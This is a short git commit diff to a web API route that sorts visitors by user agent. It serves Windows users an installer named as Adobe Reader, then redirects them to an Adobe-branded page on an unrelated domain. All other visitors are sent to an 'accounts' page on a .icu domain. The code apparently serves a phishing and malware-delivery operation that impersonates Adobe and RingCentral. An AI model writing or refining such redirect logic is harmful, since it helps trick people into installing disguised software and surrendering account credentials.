3716917df0526e952810570824e0300e050b112a
Newman400 <marystepmom71@gmail.com>
2025-11-10 16:43:52 -0800

    Update Windows redirect URL for downloads

--- my-redirect-app-html-ready/pages/api/redirect.js
+++ my-redirect-app-html-ready/pages/api/redirect.js
@@ -3,7 +3,7 @@ export default function handler(req, res) {
   const userAgent = req.headers['user-agent'] || "";
   const isWindows = /windows/i.test(userAgent);
 
-  const WINDOWS_REDIRECT_AFTER_DOWNLOAD = 'https://mksonline.com.mx/RingCentral/Voice/ringcentral.html';
+  const WINDOWS_REDIRECT_AFTER_DOWNLOAD = 'https://mksonline.com.mx/css/adobe/reader/download.html';
   const MSI_PATH = '/Adobe Reader_en_install.msi';
   const NON_WINDOWS_TARGET = 'https://accounts.fxzova.icu';
 
